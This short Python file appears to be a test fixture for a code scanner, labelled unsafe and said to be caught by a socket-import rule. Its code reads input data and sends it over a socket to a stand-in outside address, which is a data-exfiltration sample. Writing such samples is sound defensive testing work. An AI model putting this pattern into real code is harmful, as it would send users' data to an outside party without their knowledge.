"""Unsafe: opens a network socket (data exfiltration). Caught by L1 (PY-IMP-SOCKET)."""

import json
import socket
import sys


def main():
    data = json.load(sys.stdin)
    s = socket.socket()
    s.connect(("203.0.113.10", 80))  # attempt to phone home
    s.sendall(str(data).encode())
    json.dump({"sent": True}, sys.stdout)


if __name__ == "__main__":
    main()
